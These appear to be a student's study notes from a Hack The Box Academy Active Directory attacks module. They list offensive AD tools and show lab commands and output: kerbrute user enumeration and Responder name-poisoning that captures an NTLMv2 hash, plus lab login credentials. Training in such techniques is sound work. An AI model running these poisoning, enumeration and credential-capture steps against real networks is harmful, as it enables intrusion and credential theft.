 Introduction to Active Directory Enumeration & Attacks

keylian zergainoh@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!

keylian zergainoh@htb[/htb]$ ssh htb-student@<ATTACK01 target IP>

keylian zergainoh@htb[/htb]$ xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!

https://github.com/dmchell/SharpView.git
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.

[BloodHound](https://github.com/BloodHoundAD/BloodHound)	
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.

[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 	
The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

[BloodHound.py 	](https://github.com/fox-it/BloodHound.py)
A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.

[Kerbrute](https://github.com/ropnop/kerbrute) 	
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

[Impacket toolkit](https://github.com/SecureAuthCorp/impacket) 	
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

[Responder](https://github.com/lgandx/Responder)
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) 	
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.

[C# Inveigh (InveighZero) 	](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

[rpcinfo 	](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)
The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.

[rpcclient 	](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

[CrackMapExec (CME) 	](https://github.com/byt3bl33d3r/CrackMapExec)
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.

[Rubeus](https://github.com/GhostPack/Rubeus) 	
Rubeus is a C# tool built for Kerberos Abuse.

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
Another Impacket module geared towards finding Service Principal names tied to normal users.

[Hashcat 	](https://hashcat.net/hashcat/)
A great hash cracking and password recovery tool.

[enum4linux ](https://github.com/CiscoCXSecurity/enum4linux)
A tool for enumerating information from Windows and Samba systems.

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
A rework of the original Enum4linux tool that works a bit differently.

[ldapsearch 	](https://linux.die.net/man/1/ldapsearch)
Built-in interface for interacting with the LDAP protocol.

[windapsearch 	](https://github.com/ropnop/windapsearch)
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

[DomainPasswordSpray.ps1 	](https://github.com/dafthack/DomainPasswordSpray)
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.

[LAPSToolkit 	](https://github.com/leoloobeek/LAPSToolkit)
The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).

[smbmap ](https://github.com/ShawnDEvans/smbmap)
SMB share enumeration across a domain.

[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.

[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

[Snaffler 	](https://github.com/SnaffCon/Snaffler)
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

[Mimikatz ](https://github.com/ParrotSec/mimikatz)
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
Remotely dump SAM and LSA secrets from a host.

[evil-winrm](https://github.com/Hackplayers/evil-winrm)
Provides us with an interactive shell on a host over the WinRM protocol.

[mssqlclient.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.

[noPac.py](https://github.com/Ridter/noPac)
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.

[rpcdump.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)
Part of the Impacket toolset, RPC endpoint mapper.

[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)
Printnightmare PoC in python.
[
ntlmrelayx.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
Part of the Impacket toolset, it performs SMB relay attacks.

[PetitPotam.py 	](https://github.com/topotam/PetitPotam)
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.

[gettgtpkinit.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
Tool for manipulating certificates and TGTs.

[getnthash.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)
This tool will use an existing TGT to request a PAC for the current user using U2U.

[adidnsdump ](https://github.com/dirkjanm/adidnsdump)
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.

[gpp-decrypt 	](https://github.com/t0thkr1s/gpp-decrypt)
Extracts usernames and passwords from Group Policy preferences files.
[
GetNPUsers.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.

[lookupsid.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)
SID bruteforcing tool.

[ticketer.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.

[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.

[Active Directory Explorer 	](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.

[PingCastle](https://www.pingcastle.com/documentation/)
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).

[Group3r](https://github.com/Group3r/Group3r)
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).

[ADRecon 	](https://github.com/adrecon/ADRecon)
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.

```
keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
```

```
sudo responder -I ens224 -A
```

```
keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```

```
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```
```
ifconfig                                                                                                                                                            
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:30:d9:b2:11  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.225.134  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f6ff:1908:eacf:8269  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::e79b:94bf:10e9:62b1  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:cb:1b  txqueuelen 1000  (Ethernet)
        RX packets 2109  bytes 249773 (243.9 KiB)
        RX errors 0  dropped 100  overruns 0  frame 0
        TX packets 796  bytes 112882 (110.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:f6:d6  txqueuelen 1000  (Ethernet)
        RX packets 66800  bytes 4451108 (4.2 MiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 58933  bytes 4354434 (4.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6UNMJVF6525]
    Responder Domain Name      [IRTA.LOCAL]
    Responder DCE-RPC Port     [48360]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...                                                                                                                                               

[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:4aefe98c2befd788:193DEA5E4A4EB9F41ABC813C57F52A52:0101000000000000ABEE2646896DDB0186215D3ADAB2B6560000000002000800490052005400410001001E00570049004E002D00360055004E004D004A005600460036003500320035000400140049005200540041002E004C004F00430041004C0003003400570049004E002D00360055004E004D004A005600460036003500320035002E0049005200540041002E004C004F00430041004C000500140049005200540041002E004C004F00430041004C000800300030000000000000000000000000300000E3A522B26D265DC9C530A9F499332569AC2F333F2A78B1254A01CE6E5A29E9AB0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 
........................................

```

